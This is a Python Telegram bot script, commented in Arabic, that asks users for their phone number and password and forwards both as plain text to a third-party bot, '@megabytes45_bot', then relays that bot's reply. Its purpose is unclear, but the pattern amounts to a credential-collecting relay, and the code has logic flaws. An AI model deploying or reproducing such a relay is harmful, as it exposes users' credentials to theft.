import os
from telethon import TelegramClient, events
import asyncio

# جلب البيانات من المتغيرات البيئية
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

# إنشاء عميل للـ bot
client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=bot_token)

# قاموس لتخزين بيانات المستخدمين
user_data = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond('مرحبًا بك! أرسل لي رقمك ثم كلمة المرور.')
    user_data[event.sender_id] = {}

@client.on(events.NewMessage)
async def handle_message(event):
    sender_id = event.sender_id
    message = event.message.message

    if sender_id not in user_data:
        user_data[sender_id] = {}

    # التحقق إذا كان المستخدم أرسل رقم أو باسورد
    if 'number' not in user_data[sender_id]:
        user_data[sender_id]['number'] = message
        await event.respond('أرسل لي كلمة المرور.')
    elif 'password' not in user_data[sender_id]:
        user_data[sender_id]['password'] = message
        # إرسال البيانات للبوت الآخر
        await send_to_other_bot(sender_id, user_data[sender_id])
        await event.respond('تم إرسال البيانات، انتظر الرد.')

async def send_to_other_bot(sender_id, data):
    # استخدام Telethon لإرسال رسالة للبوت الآخر وانتظار الرد
    async with TelegramClient('client_session', api_id, api_hash) as other_client:
        await other_client.start()
        message_text = f"رقم: {data['number']}\nكلمة المرور: {data['password']}"
        await other_client.send_message('@megabytes45_bot', message_text)

        # استماع للرد من البوت الآخر
        @other_client.on(events.NewMessage(from_users='@megabytes45_bot'))
        async def reply_handler(event):
            reply_message = event.message.message
            # إرسال الرد للمستخدم
            await client.send_message(sender_id, f"رد البوت الآخر: {reply_message}")

        # انتظار حتى يتم استلام الرد
        await asyncio.sleep(10)

client.run_until_disconnected()
